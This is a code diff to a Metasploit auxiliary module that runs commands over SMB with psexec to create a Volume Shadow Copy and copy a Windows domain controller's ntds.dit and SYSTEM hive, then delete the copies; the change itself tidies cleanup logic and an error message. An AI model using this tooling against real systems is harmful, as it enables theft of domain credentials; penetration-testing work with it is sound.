@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 			else
 				print_error("#{peer} - Failed to find volume shadow copy")
 			end
-			cleanup_after(smbshare, ip)
+			cleanup_after(ip)
 			disconnect
 		end
 	end
@@ -141,16 +141,20 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
 			return nil
 		end
-		begin
-			cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
-			# Run cleanup command
-			out = psexec(cleanup)
-		rescue StandardError => cleanuperror
-			print_error("Cleanup Command failed: #{cleanuperror}")
+		if vscpath
+			begin
+				cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
+				# Run cleanup command
+				out = psexec(cleanup)
+			rescue StandardError => cleanuperror
+				print_error("Cleanup Command failed: #{cleanuperror}")
+				return nil
+			end
+			print_good("Volume Shadow Copy created on #{vscpath}")
+			return vscpath
+		else
 			return nil
 		end
-		print_good("Volume Shadow Copy created on #{vscpath}")
-		return vscpath
 	end
 
 
@@ -236,7 +240,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Delete the ntds.dit and SYSTEM hive copies from the Windows Temp directory
-	def cleanup_after(smbshare, ip)
+	def cleanup_after(ip)
 		print_status("Deleting ntds.dit and SYSTEM hive copies:")
 		begin
 			# Try to delete the ntds.dit and SYSTEM hive copies
@@ -265,7 +269,7 @@ class Metasploit3 < Msf::Auxiliary
 			simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 			return prepath + vsc.split("ShadowCopy")[1].chomp
 		rescue StandardError => vscpath_error
-			print_error("Could not determine the exact path to the VSC")
+			print_error("Could not determine the exact path to the VSC check your WINPATH")
 			return nil
 		end
 	end
